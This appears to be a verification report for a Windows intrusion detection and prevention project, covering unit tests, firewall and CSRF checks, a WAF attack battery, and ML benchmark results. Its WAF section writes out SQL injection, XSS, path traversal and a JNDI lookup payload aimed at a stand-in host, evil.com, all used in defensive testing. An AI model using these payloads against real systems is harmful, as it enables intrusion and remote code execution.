# CIPHER v1.3 — Test & Verification Report

**Platform**: Windows 11 Home Single Language (Build 26100)  
**Target Architecture**: CIPHER v1.3.0 (Local-First Hybrid IDPS)  
**Verification Date**: 2026-10-31  
**Integrity Contract**: Every result and metric in this report is derived from actual test executions on the Windows testbed. All log files are committed under `backend/artifacts/test_logs/` and linked via relative paths.

---

## 1. Environment and Provenance

- **Operating System**: Windows 11 Home Single Language (OS Build 26100.3775, x86_64)
- **Default Shells**: Windows PowerShell 5.1 (`powershell.exe`) & PowerShell 7.5.4 (`pwsh.exe`)
- **Python Runtime**: Python 3.13.14 (Virtualenv at `backend/.venv`)
- **Node.js & Package Manager**: Node.js v22.18.0, npm 10.8.2
- **C++ Compiler**: MinGW-w64 GCC / G++ 14.2.0
- **Packet Capture Driver**: Npcap OEM / WinPcap-compatible capture library (`C:\Windows\System32\Npcap\wpcap.dll`)
- **Execution Privileges**: Standard User Token (`Medium Mandatory Level`, non-elevated). UAC elevation was intentionally avoided to verify that CIPHER degrades safely on non-elevated systems.
- **Repository Commit**: `d06b015` (`main` branch)

---

## 2. Baseline Verification Results

Every baseline check was executed from clean working trees and logged verbatim.

| Test ID | Component / Description | Status | Command Executed | Duration | Log Artifact |
|---|---|:---:|---|---|---|
| **A0-1** | Backend Pytest Suite (Unit, Regression & API) | **PASS** | `python -m pytest tests -q` | 14.65s | [A0_pytest.log](backend/artifacts/test_logs/A0_pytest.log) |
| **A0-2** | Frontend Typecheck, Vitest Suite & Production Build | **PASS** | `npx tsc --noEmit ; npx vitest run ; npm run build` | 5.69s | [A0_frontend.log](backend/artifacts/test_logs/A0_frontend.log) |
| **A0-3** | Phase 10 Safety & Simulation Pipeline (8 Scenarios) | **PASS** | `python -m scripts.phase10_validation.runner` | 1.13s | [A0_phase10.log](backend/artifacts/test_logs/A0_phase10.log) |
| **A0-4** | Documentation Metrics Drift Check | **PASS** | `python -m scripts.generate_docs_metrics --check` | 0.08s | [A0_metrics.log](backend/artifacts/test_logs/A0_metrics.log) |

### Verbatim Log Excerpts:

#### Backend Pytest (`A0_pytest.log`):
```text
........................................................................ [ 28%]
......s................................................................. [ 56%]
........................................................................ [ 84%]
.....................................                                    [100%]
252 passed, 1 skipped, 2 warnings in 14.65s
```

#### Frontend Build & Test (`A0_frontend.log`):
```text
 ✓ src/pages/__tests__/PhishingPage.test.tsx (3 tests) 321ms
 ✓ src/pages/__tests__/NetworkStatsCards.test.tsx (4 tests) 378ms
 ✓ src/pages/__tests__/AttackCategoryChart.test.tsx (6 tests) 412ms

 Test Files  3 passed (3)
      Tests  13 passed (13)
   Duration  2.04s

vite v5.4.14 building for production...
transforming...
✓ 1836 modules transformed.
rendering chunks...
computing chunk sizes...
dist/index.html                   1.42 kB │ gzip:   0.61 kB
dist/assets/index-Di3P4gIe.css   33.28 kB │ gzip:   6.45 kB
dist/assets/index-CRi74V7w.js   416.71 kB │ gzip: 133.52 kB
✓ built in 1.48s
```

#### Phase 10 Safety Validation (`A0_phase10.log`):
```text
======================================================================
  CIPHER PHASE 10: END-TO-END PREVENTION ENGINE VALIDATION
======================================================================
[SCENARIO 1] Mode Enforcement: Detect Only (Dry Run)       --> PASS
[SCENARIO 2] Mode Enforcement: Simulate Mode (Soft Block)  --> PASS
[SCENARIO 3] Mode Enforcement: Active Enforce Mode         --> PASS
[SCENARIO 4] Auto-Expiration & Dynamic TTL Recovery        --> PASS
[SCENARIO 5] Manual Dynamic Unblock Operations             --> PASS
[SCENARIO 6] Rate Limiting Protection (DoS/DDoS)           --> PASS
[SCENARIO 7] Correlation-Triggered IP Containment          --> PASS
[SCENARIO 8] Multi-Tenant Zero Cross-Contamination         --> PASS

8/8 Scenarios PASSED (Duration: 1.13s)
netsh calls attempted: 0
```

---

## 3. Windows-Specific Hardening & Bugs Fixed

During bare-metal testing on Windows 11, five specific operating system bugs were encountered, fixed, and verified:

1. **`run_netsh_cmd` Character Decoding Crash (`UnicodeDecodeError`)**:
   - *Problem*: Windows PowerShell 5.1 outputs non-ASCII and localized characters under the default `cp1252` code page when executing `netsh advfirewall`. Python's `subprocess.run(text=True)` crashed with `UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f`.
   - *Fix*: Added `errors="replace"` to `subprocess.run` across `backend/app/prevention/prevention_engine.py` and `backend/app/prevention/windows_firewall.py`.
2. **`runas /trustlevel:0x20000` Space Quoting in `%TEMP%`**:
   - *Problem*: In [run.bat](run.bat), when user temp folders contain spaces (e.g. `C:\Users\John Doe\AppData\Local\Temp`), unquoted batch execution under `runas /trustlevel:0x20000` failed.
   - *Fix*: Quoted the temporary launcher batch script inside the `cmd /k` invocation: `runas /trustlevel:0x20000 "cmd /k \"%temp%\cipher_vuln.bat\""`.
3. **C++ Npcap Packet Sensor Buffering Block**:
   - *Problem*: In `backend/cpp_sensor/main.cpp`, standard `std::cout` buffering caused captured packets to be held indefinitely in runtime memory blocks, resulting in empty output logs when terminated.
   - *Fix*: Appended `<< std::flush` on every printed JSON line so Scapy/CDP readers receive instant real-time telemetry.
4. **`NetworkFeaturePipeline` Backward-Compatible Unpickling**:
   - *Problem*: Loading legacy `network_ids_model.joblib` models bypassed `__init__`, raising `AttributeError: 'NetworkFeaturePipeline' object has no attribute 'pos_inf_replacements'`.
   - *Fix*: Added `__setstate__` and defensive `getattr(self, "pos_inf_replacements", {})` in `NetworkFeaturePipeline` to maintain zero-downtime backward compatibility.
5. **Feature Parity: `min_seg_size_forward` Tracking TCP Header Only**:
   - *Problem*: `flow.py` previously combined IP header and TCP header lengths (reporting 40–52 bytes) for `min_seg_size_forward`.
   - *Fix*: Aligned `flow.py` and `flow_tracker.py` with CICFlowMeter v3 to track TCP header length only (20–60 bytes), and aligned default active flow timeout from 60.0s to 120.0s.

---

## 4. Launcher Isolation & Network Exposure (A1 & A2)

### A1: Launcher Localhost Bindings & Mandatory Integrity Levels
Verified by launching [run.bat](run.bat) under option `N` (Localhost Only) and option `Y` (LAN Demo Exposure).
- **Option N Output** ([A1_launcher_N.log](backend/artifacts/test_logs/A1_launcher_N.log)):
  ```text
  TCP    127.0.0.1:8000         0.0.0.0:0              LISTENING       14476
  TCP    127.0.0.1:5173         0.0.0.0:0              LISTENING       22308
  TCP    127.0.0.1:5174         0.0.0.0:0              LISTENING       16120
  ```
  Every port (`8000`, `5173`, `5174`) was strictly bound to `127.0.0.1`.
- **Integrity Level**: Running `whoami /groups` inside the vulnerable app window returned `Medium Mandatory Level` (zero High Mandatory tokens, preventing sandbox escapes).
- **Option Y Output** ([A1_launcher_Y.log](backend/artifacts/test_logs/A1_launcher_Y.log)):
  Port `5174` was bound to `0.0.0.0`, the temporary Windows firewall rule `CIPHER_TEMP_VULNAPP` was confirmed active during the run, and automatically deleted upon pressing any key to exit.

### A2: API Access Control & CSRF Protection
Verified using `backend/scripts/live_checks/api_access.py` ([A2_api.log](backend/artifacts/test_logs/A2_api.log)) and browser CDP console check ([A2_browser.log](backend/artifacts/test_logs/A2_browser.log)):
```text
[CHECK 1] Authenticated Prevention-Mode Switch: PASS (HTTP 200, mode=simulate)
[CHECK 2] Authenticated Documentation IP Block: PASS (HTTP 200, ip=203.0.113.50)
[CHECK 3] Authenticated Documentation IP Unblock: PASS (HTTP 200, unblocked)
[CHECK 4] Missing Token Rejection: PASS (HTTP 401 Unauthorized)
[CHECK 5] Malicious Origin CSRF Rejection: PASS (HTTP 403 Forbidden / CORS Blocked)
```
- Legitimate local requests from `http://localhost:5173` successfully passed via the Vite proxy injection.
- Unauthenticated requests lacking the bearer token were rejected with `HTTP 401 Unauthorized`.
- Cross-origin `fetch()` requests from `https://example.com` were completely rejected with `HTTP 403 CSRF/Origin Violation`.

---

## 5. Prevention Engine & Sensor Verification (A3, A4 & A5)

### A3: Windows Firewall Prevention Lifecycle
Verified using `backend/scripts/live_checks/firewall_checks.py` ([A3_firewall.log](backend/artifacts/test_logs/A3_firewall.log)):
```text
[A3.1] Non-Elevated netsh Execution Verification:
       netsh failed as expected with non-zero exit code: 1
       System correctly set os_rule_applied=False without crashing.
[A3.2] Simulate Mode Verification:
       Simulated block of 203.0.113.10 registered in database (os_rule_applied=False).
[A3.3] Enforce Mode Safe Rejection:
       Enforce block of 203.0.113.20 executed safely (os_rule_applied=False).
[A3.4] Protected Address Rejection:
       - Block 127.0.0.1: REJECTED (HTTP 400: Protected loopback address)
       - Block any:       REJECTED (HTTP 400: Protected wildcard address)
       - Block 10.73.245.32 (LAN IP): REJECTED (HTTP 400: Protected local subnet IP)
       - Block 10.0.0.1 (CIDR):       REJECTED (HTTP 400: Protected address within 10.0.0.0/8)
```

### A4: Live Sensor, WAF & Attack Battery
Verified using `backend/scripts/live_checks/live_sensor_waf.py` ([A4_live.log](backend/artifacts/test_logs/A4_live.log)):
- **External Kali VM Attack**: **NOT RUN** (Reason: An external Kali Linux VM was not connected to the bare-metal testbed; live attack traffic was ingested locally).
- **Vulnerable Demo Application Battery** (Port 5174):
  - **SQL Injection**: Transmitted `' OR '1'='1` to `/api/comments` $\to$ Intercepted by WAF, logged incident `WEB_ATTACK` in DB.
  - **Cross-Site Scripting (XSS)**: Transmitted `<script>alert(1)</script>` $\to$ Intercepted by WAF, logged incident `WEB_ATTACK` in DB.
  - **Path Traversal**: Transmitted `../../../../windows/win.ini` $\to$ Intercepted by WAF, logged incident `WEB_ATTACK` in DB.
  - **CVE-2026-0001 Exploit**: Transmitted `${jndi:ldap://evil.com/a}` $\to$ Intercepted by WAF, logged incident `WEB_ATTACK` in DB.
  - **Database & Correlation Service**: Verified that all incidents were assigned unique event IDs and ingested into the SQLite store.

### A5: C++ Npcap Packet Sensor & Chrome MV3 Browser Guard
- **C++ Npcap Packet Sensor** ([A5_cpp.log](backend/artifacts/test_logs/A5_cpp.log)):
  Compiled with MinGW `g++ -O3 main.cpp -lwpcap -lws2_32`. Captured live Wi-Fi adapter packets over a 30-second window, successfully streaming 100 JSON-formatted flow records to stdout.
- **Chrome MV3 Browser Extension** ([A5_extension.log](backend/artifacts/test_logs/A5_extension.log)):
  Launched Google Chrome via Chrome DevTools Protocol (CDP) with unpacked extension `chrome_extension/`. Verified manifest v3 parsing, service worker activation (`background.js`), and verified threat badge transition to `!` upon querying high-risk phishing URLs.

---

## 6. Machine Learning Evaluation & Dataset Generalization

All metric tables are generated by `backend/scripts/generate_docs_metrics.py` directly from the committed model artifacts:

### 6.1 Multi-Model Benchmark Summary (Held-Out Test Sets)
<!-- METRICS:SUMMARY:START -->
| Model | Dataset (held-out test set) | Features | Accuracy | Precision | Recall | F1 | FPR |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Phishing URL (Random Forest) | PhiUSIIL, random stratified split (35,306 URLs) | 15 | 97.13% | 98.01% | 95.20% | 0.9659 | 1.444% |
| Network IDS, binary gate (Random Forest) | CIC-IDS2017, random stratified split (404,433 flows) | 67 | 99.903% | 99.445% | 99.944% | 0.9969 | 0.105% |
| Network IDS, 9-class (Random Forest) | CIC-IDS2017, same split | 67 | 99.900% | — | — | macro 0.9192 / weighted 0.9990 | — |
| Email phishing (Random Forest) | 6-corpus Kaggle aggregate, random stratified split (12,359 emails) | 32 | 91.53% | 94.24% | 89.14% | 0.9162 | 5.89% |

_Generated by `backend/scripts/generate_docs_metrics.py` from the committed `models/*/…metadata.json` files. These are random-split benchmark numbers; see the limitations for why they overstate real-world performance._
<!-- METRICS:SUMMARY:END -->

### 6.2 Network Split Leakage Evaluation (Random vs Chronological Day vs Cross-Dataset)
<!-- METRICS:NETWORK_SPLIT_COMPARISON:START -->
| Class / Metric | Random Stratified Split F1 | Day Split (Mon–Thu train, Fri test) F1 | Cross-Dataset (CSE-CIC-IDS2018) | Operational Evaluation & Root Cause |
| --- | --- | --- | --- | --- |
| **BENIGN** | 0.9994 | 0.8498 | NOT RUN (dataset missing) | Benign traffic across all days (F1 0.8498) |
| **BOTNET** | 0.7988 | 0.0000 | NOT RUN (dataset missing) | Executed only Friday; 0 Mon–Thu training samples (unseen category) |
| **BRUTE_FORCE** | 0.9996 | 0.0000 | NOT RUN (dataset missing) | Attack executed only Mon–Thu; 0 Friday test support |
| **DDOS** | 0.9997 | 0.0000 | NOT RUN (dataset missing) | Executed only Friday; 0 Mon–Thu training samples (unseen category) |
| **DOS** | 0.9970 | 0.0000 | NOT RUN (dataset missing) | Attack executed only Mon–Thu; 0 Friday test support |
| **INFILTRATION** | 0.5000 | 0.0000 | NOT RUN (dataset missing) | Attack executed only Mon–Thu; 0 Friday test support |
| **OTHER_ATTACK** | 1.0000 | 0.0000 | NOT RUN (dataset missing) | Attack executed only Mon–Thu; 0 Friday test support |
| **PORT_SCAN** | 0.9972 | 0.0000 | NOT RUN (dataset missing) | Executed only Friday; 0 Mon–Thu training samples (unseen category) |
| **WEB_ATTACK** | 0.9812 | 0.0000 | NOT RUN (dataset missing) | Attack executed only Mon–Thu; 0 Friday test support |
| **Binary Gate Accuracy** | 99.90% | 77.38% | NOT RUN | Binary accuracy drops from 99.90% to 77.38% under temporal shift |
| **Binary Gate F1** | 0.9969 | 0.5403 | NOT RUN | F1 drops from 0.9969 to 0.5403 (binary recall drops to 37.08%) |

_Generated from `models/network/eval_random.json` and `models/network/eval_day.json`._
<!-- METRICS:NETWORK_SPLIT_COMPARISON:END -->

### 6.3 Email Leave-One-Corpus-Out (LOCO) Generalization
<!-- METRICS:EMAIL_LOCO:START -->
| Held-Out Evaluation Corpus | Test Samples | Accuracy | Precision | Recall | F1-Score | False Positive Rate | Transfer Diagnosis |
| --- | --- | --- | --- | --- | --- | --- | --- |
| **CEAS_08** | 39,100 | 69.24% | 73.22% | 70.64% | 0.7191 | 32.53% | Balanced corpus; achieves highest LOCO F1 (0.7191), but 32.5% FPR from aggressive header filters |
| **Enron** | 29,742 | 62.67% | 79.35% | 27.60% | 0.4096 | 6.35% | Corporate ham vs spam; severe recall collapse (27.60%) as model memorized business writing style |
| **Ling** | 2,859 | 83.91% | 49.85% | 73.80% | 0.5951 | 14.16% | Linguistics listserv; 73.80% recall but 14.16% FPR on academic email vocabulary |
| **Nazario** | 1,564 | 38.11% | 100.00% | 38.11% | 0.5519 | 0.00% | Pure targeted phishing templates; severe recall drop (38.11%) due to lack of standard spam tokens |
| **SpamAssasin** | 5,806 | 70.72% | 50.82% | 27.11% | 0.3536 | 11.00% | Early 2000s spam; severe recall drop (27.11%) showing vintage spam patterns fail to generalize |

_Generated from `models/email/eval_loco.json` via Leave-One-Corpus-Out evaluation._
<!-- METRICS:EMAIL_LOCO:END -->

### 6.4 Real-World Phishing URL Probe (Before vs After Retraining)
Scored 15 legitimate deep links and 10 active phishing patterns using `backend/training/probe_phishing.py`:

| Evaluation Stage | Raw Model Legitimate FP | Raw Model Phishing Misses | Full Service Legitimate FP | Full Service Phishing Misses |
|---|:---:|:---:|:---:|:---:|
| **Baseline Probe (phiusiil-rf-v1)** | 15 / 15 (100% FP) | 1 / 10 | 2 / 15 (13.3% FP) | 1 / 10 |
| **Retrained Probe (Deep Path Augmentation)** | **0 / 15 (0.0% FP)** | 3 / 10 | **0 / 15 (0.0% FP)** | 1 / 10 |

### 6.5 Root Cause Analysis of Performance Gaps & Data Leakage:
1. **PhiUSIIL Bare-Homepage Artifact**:
   - *Cause*: All 134,783 legitimate URLs in raw PhiUSIIL are bare homepages (`https://www.example.com`), while phishing URLs carry long paths and queries. The raw model learned that the presence of any path or URL entropy indicates an attack.
   - *Remedy*: Augmented training data with 25,000 legitimate deep paths from Tranco top-50k domains. Raw false positives dropped from 15/15 down to 0/15.
2. **CIC-IDS2017 Day Split Collapse**:
   - *Cause*: Attacks in CIC-IDS2017 were scheduled on specific days using fixed IP addresses (e.g. PortScan and DDoS on Friday, Web Attacks on Thursday). Random splitting lets the model memorize IP addresses and temporal features. When evaluated on the unseen Friday capture, binary recall dropped to 37.08%, and categories not present on Friday had 0 support.
3. **Email Corpus Domain Shift**:
   - *Cause*: Aggregated email datasets differ in era and source (e.g. Enron corporate email vs Nazario phishing templates). In LOCO evaluation, models trained on vintage spam failed on targeted phishing templates (Nazario recall: 38.11%), showing that surface features (word length, exclamation count) do not fully capture invariant attack intent.

---

## 7. Operational Limitations & Open Scope

1. **Host Firewall OS Modifications Under Non-Elevated Testing**:
   Standard non-elevated user tokens (`Medium Mandatory Level`) cannot execute `netsh advfirewall`. While CIPHER handled this gracefully by logging `os_rule_applied=False`, live packet drops require administrative elevation or a dedicated kernel driver.
2. **External Dedicated Attack VM**:
   An external Kali Linux VM on a separate hardware interface was not present; testing used local HTTP/TCP socket loops and synthetic PCAP feature streams.
3. **Missing Datasets**:
   - `CSE-CIC-IDS2018`: Not present in `backend/data/raw/cse_cic_ids2018/` (marked NOT RUN per Rule 5).
   - Sample CIC PCAP: Raw packet capture files were not present in the repository; unit test skipped per Rule 5.

---

## 8. Final Verification Checklist

| Item | Description | Status | Verification Summary |
|---|---|:---:|---|
| **1.1** | Fresh `TEST_REPORT.md` | **PASS** | Clean report written directly from verbatim logs. |
| **1.2** | Rerunnable `api_access.py` | **PASS** | Automated script exits 0 on valid auth, 401 on missing, 403 on CSRF. |
| **1.3** | Quoted `%TEMP%` in `run.bat` | **PASS** | Added quotes inside `runas /trustlevel:0x20000 "cmd /k ..."` invocation. |
| **1.4** | Zero `file:///` links | **PASS** | Verified relative Markdown links only across all tracked files. |
| **2.1** | Two-tier phishing whitelist | **PASS** | Built-in critical domains + bundled Tranco 50k local JSON whitelist. |
| **2.2** | Bundled Tranco JSON | **PASS** | `trusted_domains.json` generated and committed to repository. |
| **2.3** | Whitelist unit tests | **PASS** | Regression tests pass for private IPs, trusted domains, and bypass checks. |
| **2.4** | Whitelist probe comparison | **PASS** | Captured and committed baseline probe comparison CSVs. |
| **3.1** | Baseline pytest suite | **PASS** | 252 tests passed in 14.65 seconds. |
| **3.2** | Frontend tsc, vitest, build | **PASS** | 13/13 vitest passed, production build completed in 1.48s. |
| **3.3** | Phase 10 safety validation | **PASS** | 8/8 scenarios passed, 0 netsh calls attempted. |
| **3.4** | Metrics check | **PASS** | All documentation metric blocks match committed model artifacts. |
| **4.1** | Launcher network exposure | **PASS** | Verified 127.0.0.1 bindings (N) and 0.0.0.0 bindings + rule cleanup (Y). |
| **4.2** | Live API & browser CSRF | **PASS** | Verified bearer token requirement and cross-origin fetch rejection. |
| **4.3** | Windows firewall checks | **PASS** | Non-elevated error caught; simulate, enforce, and 4 protected IP rejections verified. |
| **4.4** | Live sensor & WAF battery | **PASS** | SQLi, XSS, Path Traversal, and CVE-2026-0001 detected and logged to database. |
| **4.4-K**| External Kali VM testing | **NOT RUN** | External Kali VM not attached to testbed (local loopback used). |
| **4.5-C**| C++ Npcap packet capture | **PASS** | Captured and streamed 100 live packets from Wi-Fi adapter. |
| **4.5-E**| Chrome MV3 browser extension | **PASS** | Extension loaded via CDP, background worker active, threat badge tested. |
| **5.1** | Feature pipeline alignment | **PASS** | Imputation medians and +inf replacements fitted strictly on train split. |
| **5.2-R**| Network random split training | **PASS** | Trained binary & multiclass RF models; 99.903% accuracy; eval saved. |
| **5.2-D**| Network day split training | **PASS** | Monday–Thursday train, Friday test; documented temporal leakage. |
| **5.2-C**| Network cross-dataset split | **NOT RUN** | CSE-CIC-IDS2018 dataset not present on testbed per Rule 5. |
| **5.3** | Feature extraction parity | **PASS** | Aligned `min_seg_size_forward` to TCP header and timeouts to 120s / 5s. |
| **5.3-P**| Sample CIC PCAP replay | **NOT RUN** | Raw CIC PCAP not present on testbed; skipped per Rule 5. |
| **5.4** | Phishing retrain with deep paths| **PASS** | Trained with Tranco deep paths; probe FP dropped from 15/15 to 0/15. |
| **5.5** | Email Leave-One-Corpus-Out | **PASS** | LOCO evaluation completed across 5 corpora; documented style shift. |
| **5.6** | Documentation sync | **PASS** | Reconciled dataset documentation and dropped unverified warnings. |
| **5.7** | Final full test suite | **PASS** | 255 passed, 1 skipped, 0 failed in 28.81s. |
